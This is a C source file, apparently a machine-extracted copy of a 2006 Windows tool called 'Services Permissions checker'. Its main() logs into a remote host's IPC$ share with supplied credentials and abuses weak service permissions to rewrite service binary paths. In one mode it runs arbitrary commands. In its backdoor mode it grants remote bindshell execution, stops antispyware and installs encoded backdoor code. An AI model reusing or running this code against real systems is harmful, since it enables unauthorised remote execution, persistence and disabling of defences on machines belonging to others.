#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {char* lpRemoteName; int /*<<< orphan*/ * lpLocalName; int /*<<< orphan*/ * lpProvider; int /*<<< orphan*/  dwType; } ;
typedef  int /*<<< orphan*/  SERVICE_STATUS_PROCESS ;
typedef  int /*<<< orphan*/ * SC_HANDLE ;
typedef  TYPE_1__ NETRESOURCE ;
typedef  int DWORD ;
typedef  int /*<<< orphan*/  CurrentUserName ;

/* Variables and functions */
 scalar_t__ BACKDOOR ; 
 int /*<<< orphan*/  CONNECT_COMMANDLINE ; 
 int /*<<< orphan*/  CONNECT_UPDATE_PROFILE ; 
 int ChangeServiceConfig (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  CloseServiceHandle (int /*<<< orphan*/ *) ; 
 scalar_t__ ControlService (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 char* EncodedBackdoor ; 
 int GetLastError () ; 
 int /*<<< orphan*/  GetUserName (char*,int*) ; 
 int HELP ; 
 int LIST ; 
 int /*<<< orphan*/  ListVulnerableService (char*) ; 
 int NO_ERROR ; 
 int /*<<< orphan*/ * OpenSCManager (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/ * OpenService (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  RESOURCETYPE_ANY ; 
 char* RemoteHost ; 
 int /*<<< orphan*/  SERVICE_AUTO_START ; 
 int SERVICE_CHANGE_CONFIG ; 
 int /*<<< orphan*/  SERVICE_CONTROL_STOP ; 
 int /*<<< orphan*/  SERVICE_ERROR_IGNORE ; 
 int /*<<< orphan*/  SERVICE_NO_CHANGE ; 
 int SERVICE_START ; 
 int SERVICE_STOP ; 
 int STANDARD_RIGHTS_WRITE ; 
 int STOP ; 
 int /*<<< orphan*/  StartModifiedService (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  TRUE ; 
 int WNetAddConnection2 (TYPE_1__*,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  WNetCancelConnection2 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 char* antispyware ; 
 int /*<<< orphan*/  doFormatMessage (int) ; 
 int /*<<< orphan*/  exit (int) ; 
 char* firewall ; 
 char* init ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/ * strchr (char*,char) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  usage () ; 

int main(int argc, char* argv[]) {

 SC_HANDLE SCM,Svc;
 DWORD ret,len;
 char CurrentUserName[256];
 char *newPath=NULL;
 char *host=NULL;
 char *user=NULL;
 char *pass=NULL;
 char *srv=NULL;
 int i;
 NETRESOURCE NET;
  SERVICE_STATUS_PROCESS StopStatus;

 printf(" Services Permissions checker v2.0\n");
 printf(" (c) 2006 Andres Tarasco - atarasco%cgmail.com\n\n",'@');

 if (argc==1) usage();
 for (i=1;i<argc;i++) {
    if ( (strlen(argv[i])==2) && (argv[i][0]=='-') ) {
        switch (argv[i][1]) {
            case 'l': LIST=1; break;
            case 'm': srv=argv[i+1]; i=i+1;break;
            case 'u': if (!host) usage(); user=argv[i+1]; i=i++; break;
            case 'p': if (!host) usage(); pass=argv[i+1]; i=i++; break;
            case 'H': host=argv[i+1]; i=i++; break;
            case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;
            case 's': STOP=1; break;
            case '?': HELP=1; usage(); break;
            default: printf("Unknown Parameter: %s\n",argv[i]);usage(); break;
        }
    }
 }

 if ((!LIST) && (!srv) )usage();

 if (host) { //InicializaciÃ³n.. ConexiÃ³n al sistema remoto..
    printf("[+] Trying to connect to remote SCM\n");
    sprintf(RemoteHost,"\\\\%s\\IPC$",host);
    printf("[+] Host: %s\n",RemoteHost);
    printf("[+] Username: %s\n",user);
    printf("[+] Password: %s\n",pass);

    NET.dwType = RESOURCETYPE_ANY;
    NET.lpProvider = NULL;
    NET.lpLocalName=NULL;
    NET.lpRemoteName = (char *)RemoteHost;
    ret=WNetAddConnection2(&NET,pass,user,CONNECT_COMMANDLINE);//CONNECT_PROMPT);//CONNECT_UPDATE_PROFILE);

    //verificaciÃ³n de errores de conexiÃ³n...
    if ( (ret!=NO_ERROR) && (user !=NULL) ) {
        if (ret==1219) { //connection already created. Disconnecting..
            printf("[-] Credentials mismatch. Removing old connection\n");
            WNetCancelConnection2(RemoteHost,NULL,TRUE);
            ret=WNetAddConnection2(&NET,pass,user,CONNECT_UPDATE_PROFILE);
        } else {
            if (ret==1326) { //usuario o contraseÃ±a incorrecta
             if (strchr(user,'\\')==NULL) {
                 sprintf(CurrentUserName,"localhost\\%s",user);
                printf("[-] Unknown Username or password\n");
                printf("[+] Trying \"%s\" as new username\n",CurrentUserName);
                ret=WNetAddConnection2(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);
             }
            }
        }
        if (ret!=NO_ERROR) {
            printf("WNetAddConnection Failed to %s (%s/ %s)\n",RemoteHost,user,pass);
            doFormatMessage(GetLastError());
            exit(-1);
        }
    }
    printf("[+] Network Connection OK\n");

 } else {
    printf("[+] Trying to enumerate local resources\n");
    len=sizeof(CurrentUserName)-1;
    GetUserName(  CurrentUserName,&len);
    printf("[+] Username: %s\n",CurrentUserName);
 }


if (LIST) {
    ListVulnerableService(host);
    exit(1);
}

//SERVICE HACKS HERE!!


SCM = OpenSCManager(host,NULL,STANDARD_RIGHTS_WRITE | SERVICE_START );
if (!SCM){
    printf("[-] OpenScManager() FAILED\n");
    doFormatMessage(GetLastError());
    exit(-1);
}
if (STOP) {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP);
} else {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE);
}

if (Svc==NULL) {
    printf("[-] Unable to open Service %s\n",srv);
    exit(-1);
}

//        printf("[+] Using leetz skillz to execute backdoor =)\n");

//Delete previous installed

if (STOP) {
 printf("[+] Stopping previously running instances...\n");
 if (ControlService(Svc,SERVICE_CONTROL_STOP,&StopStatus)!=0) {
    doFormatMessage(GetLastError());

 }
 exit(-1);
}


 if (BACKDOOR) {
    printf("[+] Uninstalling previous backdoors\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,init,NULL,NULL,"",
        NULL,NULL,NULL);

        if (ret!=0) StartModifiedService(SCM,srv,0);

    printf("[+] Granting Remote bindshell Execution..\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,firewall,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Shutting down remote antispyware Service =)\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,antispyware,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Installing Backdoor Code...\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,EncodedBackdoor,NULL,NULL,"",
        NULL,NULL,NULL);
 } else { //Ejecutando parametros especificados con -c
    printf("[+] Sending custom commands to the service\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,newPath,NULL,NULL,"",
        NULL,NULL,NULL);
 }

 if (ret!=0) {
    printf("[+] The service have been succesfully modified =)\n");
    CloseServiceHandle(Svc);
    StartModifiedService(SCM,srv,1);
 } else {
    printf("[-] Service modification Failed\n");
    doFormatMessage(ret);
 }
 CloseServiceHandle(SCM);
 if (host) WNetCancelConnection2(RemoteHost,NULL,TRUE);
 return(1);
}